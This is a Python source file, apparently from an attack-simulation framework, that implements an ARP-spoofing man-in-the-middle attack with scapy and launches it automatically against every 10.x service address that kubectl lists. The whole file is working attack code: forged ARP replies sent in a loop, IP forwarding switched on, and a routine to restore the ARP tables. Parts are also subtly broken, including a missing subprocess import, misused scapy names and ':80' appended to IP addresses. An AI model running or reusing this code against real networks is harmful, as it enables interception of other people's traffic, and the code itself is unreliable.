from scapy.all import *
import sys
import os
import time
from ..attack import Attack

class SSLTLSAttack(Attack):
    def __init__(self, victim_ip, gateway_ip):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        super().__init__("ssl_tls")

    def enable_ip_forwarding(self):
        print("[*] Enabling IP Forwarding...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def disable_ip_forwarding(self):
        print("[*] Disabling IP Forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def get_mac(self, ip):
        conf.verb = 0
        ans, unans = srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, inter=0.1)
        for snd, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")
        raise Exception(f"MAC address for IP {ip} not found")

    def rearp(self):
        print("[*] Restoring Targets...")
        victim_mac = self.get_mac(self.victim_ip)
        gateway_mac = self.get_mac(self.gateway_ip)
        send(scapy.ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)
        send(scapy.ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=7)
        self.disable_ip_forwarding()
        print("[*] Shutting Down...")
        sys.exit(1)

    def trick(self, gateway_mac, victim_mac):
        send(scapy.ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip, hwdst=victim_mac))
        send(scapy.ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip, hwdst=gateway_mac))

    def mitm(self):
        try:
            victim_mac = self.get_mac(self.victim_ip)
        except Exception as e:
            self.disable_ip_forwarding()
            print(f"[!] Couldn't Find Victim MAC Address: {e}")
            print("[!] Exiting...")
            sys.exit(1)
        
        try:
            gateway_mac = self.get_mac(self.gateway_ip)
        except Exception as e:
            self.disable_ip_forwarding()
            print(f"[!] Couldn't Find Gateway MAC Address: {e}")
            print("[!] Exiting...")
            sys.exit(1)

        print("[*] Poisoning Targets...")
        try:
            while True:
                self.trick(gateway_mac, victim_mac)
                time.sleep(1.5)
        except KeyboardInterrupt:
            self.rearp()

    def attack(self, wait):
        self.enable_ip_forwarding()
        time.sleep(wait)
        self.mitm()

    def clean_up(self, wait):
        time.sleep(wait)
        self.rearp()

    def get_log_start(self):
        return f"[{self.time_start}][{self.name}][{self.victim_ip}] Attack Started"
    
    def get_log_end(self):
        self.finalize()
        return f"[{self.time_end}][{self.name}][{self.victim_ip}] Attack Ended"

def get_ips():
    result = subprocess.run("kubectl get services --all-namespaces".split(), capture_output=True, text=True)
    output = [h+":80" for h in result.stdout.strip().split() if h.startswith("10.")]
    return output





# Example usage for a component:
for h in get_ips():
    gateway = h.split(".")
    gateway[-1] = "1:80"
    gateway = ".".join(gateway)
    ssltls_attack = SSLTLSAttack(h, gateway)
    try:
        ssltls_attack.attack(5)
    except KeyboardInterrupt:
        ssltls_attack.clean_up(5)

